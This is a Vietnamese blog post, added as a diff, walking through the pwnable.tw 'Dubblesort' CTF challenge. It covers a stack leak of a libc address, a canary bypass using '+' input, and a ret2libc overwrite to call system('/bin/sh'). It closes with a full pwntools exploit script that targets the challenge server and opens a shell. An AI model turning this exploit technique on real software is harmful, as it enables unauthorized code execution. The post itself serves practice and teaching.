@@ -1,0 +1,155 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>[Pwnable.tw] – Dubblesort // DatNLQ</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.88.1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="DatNLQ" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://datnlq.github.io/css/main.min.4a7ec8660f9a44b08c4da97c5f2e31b1192df1d4d0322e65c0dbbc6ecb1b863f.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="[Pwnable.tw] – Dubblesort"/>
+<meta name="twitter:description" content="[Pwnable.tw] – Dubblesort Tiếp theo chúng ta sẽ làm 1 bài sử dụng kỹ thuật ret2libc :3
+Kiểm tra các cơ chế bảo vệ và các thông tin cơ bản của file
+Sau đó dùng IDA để phân tích file binary và code C:
+Chạy test thử chương trình như hình dưới thì vô tình thấy được 1 vài ký tự lạ xuất hiện sau chuỗi được in ra.
+==&gt; Đây là 1 lỗi có thể khai thác"/>
+
+    <meta property="og:title" content="[Pwnable.tw] – Dubblesort" />
+<meta property="og:description" content="[Pwnable.tw] – Dubblesort Tiếp theo chúng ta sẽ làm 1 bài sử dụng kỹ thuật ret2libc :3
+Kiểm tra các cơ chế bảo vệ và các thông tin cơ bản của file
+Sau đó dùng IDA để phân tích file binary và code C:
+Chạy test thử chương trình như hình dưới thì vô tình thấy được 1 vài ký tự lạ xuất hiện sau chuỗi được in ra.
+==&gt; Đây là 1 lỗi có thể khai thác" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://datnlq.github.io/posts/dubblesort/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-12-09T14:57:14+07:00" />
+<meta property="article:modified_time" content="2021-12-09T14:57:14+07:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://datnlq.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="DatNLQ" /></a>
+      <h1>DatNLQ</h1>
+      <p>DatNLQ&#39;s personal website</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/datnlq" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>My Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">[Pwnable.tw] – Dubblesort</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Dec 9, 2021
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          3 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h2 id="pwnabletw--dubblesorthttpspwnabletwchallenge4">[Pwnable.tw] – <a href="https://pwnable.tw/challenge/#4">Dubblesort</a></h2>
+<p>Tiếp theo chúng ta sẽ làm 1 bài sử dụng kỹ thuật ret2libc :3</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/dubblesort/dubblersort.png?raw=true" alt="img"></p>
+<p>Kiểm tra các cơ chế bảo vệ và các thông tin cơ bản của file</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/dubblesort/dubblersort_checkfile.png?raw=true" alt="img"></p>
+<p>Sau đó dùng IDA để phân tích file binary và code C:</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/dubblesort/dubblersort_IDA.png?raw=true" alt="img"></p>
+<p>Chạy test thử chương trình như hình dưới thì vô tình thấy được 1 vài ký tự lạ xuất hiện sau chuỗi được in ra.</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/dubblesort/dubblersort_leakbug.png?raw=true" alt="img"></p>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/dubblesort/dubblersort_sort%20.png?raw=true" alt="img"></p>
+<p>==&gt; Đây là 1 lỗi có thể khai thác</p>
+<p>Nói vu vơ vậy nhưng chúng ta phải mở debug lên mới có thể thấy rõ được đây có phải là lỗi hay không :vv</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/dubblesort/dubblersort_debug.png?raw=true" alt="img"></p>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/dubblesort/dubblersort_debug_stack1.png?raw=true" alt="img"></p>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/dubblesort/dubblersort_debug_stack.png?raw=true" alt="img"></p>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/dubblesort/dubblersort_debug_teststack.png?raw=true" alt="img"></p>
+<p>Như chúng ta thấy thì khi chúng ta nhập vào trong stack thì chuỗi đưa vào không có ký tự kết thúc chuỗi :3 Nên là chương trình sẽ in ra chuỗi mình nhập vào và các giá trị trong stack cho đến khi nhận được ký tự kết thúc chuỗi.</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/dubblesort/dubblersort_debug_sort_retmain.png?raw=true" alt="img"></p>
+<p>Chúng ta xác định được vị trí của input trên stack và khi kiểm tra libc bằng lệnh vmmap chúng ta nhận ra rằng có thể leak được địa chỉ của libc trên stack như sau:</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/dubblesort/dubblersort_debug_vmmap.png?raw=true" alt="img"></p>
+<p>Dựa vào lỗi trên là chúng ta đã có thể leak được libc base để tiến sang bước tiếp theo.  Đây là thư viện dùng chung tại máy local. Tuy nhiên trên server dùng thư viện libc_32.so.6, do đó ta phải chuyển đổi sang offset tương ứng của libc_32.so.6. Như vậy để tính địa chỉ bắt đầu của libc_32.so.6 khi thực thi trên server, ta chỉ cần lấy địa chỉ leak được – 0x1b000a.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">addr_libc = addr_leak - 0x1b000a
+</code></pre></div><p>Có được địa chỉ bắt đầu của libc, ta dễ dàng tìm được địa chỉ của hàm system() và chuỗi “/bin/sh” có sẵn trong libc.</p>
+<p>Phân tích chức năng tiếp theo chúng ta nhận thấy được rằng chương trình không hề giới hạn số lượng số ghi vào stack để sort, cho dù vượt quá stack :vv điều đó có nghĩa là mình có thể ghi lên địa chỉ ret nếu biết được offset tuy nhiên thì hoàn toàn có thể thay đổi giá trị của stack.</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/dubblesort/dubblersort_test.png?raw=true" alt="img"></p>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/dubblesort/dubblersort_testsort%20.png?raw=true" alt="img"></p>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/dubblesort/dubblersort_sort_test_stack.png?raw=true" alt="img"></p>
+<p>Tuy nhiên phải quay lại cơ chế bảo vệ 1 chút đó là canary đã được bật, chúng ta phải bypass canary nữa mới hoàn thành được. Và trong lần thử nếu thay vì mình nhập số bất kỳ thì mình nhập &ldquo;+&rdquo; sẽ giữ lại giá trị trong stack. Đây là 1 điều kiện quan trọng để giữ nguyên giá trị canary.</p>
+<p>Sử dụng debug để xác định vị trí của canary là ở offset thứ 24 bằng cách như sau:</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/dubblesort/dubblersort_canary.png?raw=true" alt="img"></p>
+<p>Sau khi nhập sort rồi thì có thể mở stack lên để tính toán offset:</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/dubblesort/dubblersort_canary_offset.png?raw=true" alt="img"></p>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/dubblesort/dubblersort_sort_stack.png?raw=true" alt="img"></p>
+<p>===&gt;    + ‘1’ * 24 để điền đầy mảng NUMBERS
++ ‘+’ để bypass canary
++ addr_system * 8. Trong đó số thứ 8 là vị trí của return address thực sự, còn 7 số đầu nhằm mục đích padding và không làm thay đổi thứ tự stack.
++ addr_binsh * 2. Trong đó số thứ 2 là vị trí của tham số, còn số thứ 1 là return address của hàm system().</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">from pwn import *
+
+BIN = &#39;./dubblesort&#39;
+libc = ELF(&#34;./libc_32.so.6&#34;)
+#libc = ELF(&#34;./usr/lib/i386-linux-gnu/libc-2.32.so&#34;)
+
+def exploit():
+    # __breakpoint=&#34;&#34;&#34;
+    #     b*main+146
+    #     &#34;&#34;&#34;
+    # gdb.attach(io,__breakpoint)
+    io.sendlineafter(b&#34;What your name :&#34;,b&#39;A&#39;*4*6)
+    io.recvuntil(b&#34;A&#34;*4*6)
+    libc_base = u32(io.recv(4))-0x1b000a
+    print(&#34;Libc_base : &#34;, hex(libc_base))
+    system = libc_base + libc.symbols[&#39;system&#39;]
+    bin_sh = libc_base + next(libc.search(b&#34;/bin/sh&#34;))
+    print(&#39;System : &#39;,hex(system))
+    print(&#39;Bin_sh : &#39;,hex(bin_sh))
+    l = 24 + 1 + 9 + 1
+    io.sendlineafter(&#39;to sort :&#39;,str(l))
+    for i in range(24):
+        io.sendlineafter(&#39;number : &#39;,&#39;1&#39;)
+    io.sendline(&#39;+&#39;) #canary
+    for i in range(9):
+        io.sendlineafter(&#39;number : &#39;,str(system))
+    io.sendlineafter(&#39;number : &#39;,str(bin_sh))
+    io.interactive()
+
+
+#io = process(BIN) #,env={&#34;LD_PRELOAD&#34;:&#34;./libc_32.so.6&#34;}
+io = remote(&#39;chall.pwnable.tw&#39;,10101)
+context.log_level = &#39;debug&#39;
+exploit()
+</code></pre></div>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
